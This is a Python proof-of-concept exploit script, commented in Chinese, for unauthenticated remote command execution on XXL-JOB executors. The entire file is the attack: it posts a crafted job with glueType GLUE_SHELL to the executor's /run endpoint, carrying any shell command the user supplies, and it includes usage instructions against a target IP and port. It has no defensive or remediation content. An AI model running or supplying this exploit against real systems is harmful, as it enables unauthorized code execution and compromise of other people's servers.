#!/usr/bin/env python3
"""
XXL-JOB Executor GLUE_SHELL RCE POC
用法: python3 poc.py <target> <port> <command>
示例: python3 poc.py 192.168.1.100 9999 "id"
"""

import requests
import sys
import json

def exploit(target, port, command):
    url = f"http://{target}:{port}/run"
    headers = {
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Accept-Language": "en",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
        "Connection": "close",
        "Content-Type": "application/json",
    }
    data = {
        "jobId": 1,
        "executorHandler": "demoJobHandler",
        "executorParams": "demoJobHandler",
        "executorBlockStrategy": "COVER_EARLY",
        "executorTimeout": 0,
        "logId": 1,
        "logDateTime": 1586629003729,
        "glueType": "GLUE_SHELL",
        "glueSource": command,
        "glueUpdatetime": 1586699003758,
        "broadcastIndex": 0,
        "broadcastTotal": 0
    }

    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)
        print(f"[*] 状态码: {r.status_code}")
        print(f"[*] 响应内容: {r.text}")
        if r.status_code == 200:
            print("[+] 命令执行成功")
        else:
            print("[-] 命令可能未成功执行")
    except Exception as e:
        print(f"[-] 连接失败: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"用法: {sys.argv[0]} <目标IP> <端口> <命令>")
        sys.exit(1)
    target = sys.argv[1]
    port = int(sys.argv[2])
    command = sys.argv[3]
    exploit(target, port, command)